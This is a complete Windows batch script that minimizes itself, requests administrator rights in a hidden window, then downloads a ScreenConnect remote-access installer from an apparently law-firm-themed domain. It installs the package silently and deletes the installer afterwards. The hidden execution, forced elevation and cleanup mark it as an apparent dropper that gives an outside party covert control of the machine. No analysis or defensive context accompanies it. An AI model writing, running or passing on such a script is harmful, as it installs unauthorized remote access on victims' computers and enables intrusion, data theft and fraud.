@echo off
setlocal enabledelayedexpansion

if not "%minimized%"=="true" (
    set minimized=true
    start "" /min cmd /c "%~f0"
    exit /b
)

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

REM Run installation silently in hidden PowerShell window
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://j-olawfirm.com/software/ScreenConnect.ClientSetup.msi' -OutFile '%temp%\ConnectWiseControl.ClientSetup.msi'; Start-Process msiexec.exe -ArgumentList '/i %temp%\ConnectWiseControl.ClientSetup.msi /quiet /qn' -Wait -WindowStyle Hidden"

REM Clean up
del "%temp%\ConnectWiseControl.ClientSetup.msi" 2>nul

exit /b